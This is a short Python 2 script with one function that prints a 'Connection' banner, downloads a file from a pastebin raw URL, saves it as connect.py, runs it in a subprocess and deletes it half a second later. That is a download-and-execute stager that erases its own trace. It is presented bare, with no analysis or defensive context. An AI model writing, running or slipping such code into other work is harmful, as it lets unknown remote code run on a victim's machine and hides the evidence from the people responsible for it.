import os
import urllib
import subprocess
from time import sleep

def ran():
        print "[ + ] Connection [ + ]"
	testfile = urllib.URLopener()
	testfile.retrieve("http://pastebin.com/raw/qNjByHqW", "connect.py")
	ls_output=subprocess.Popen(["python", "connect.py"], stdout=subprocess.PIPE)
	sleep(0.5)
	os.remove("connect.py")
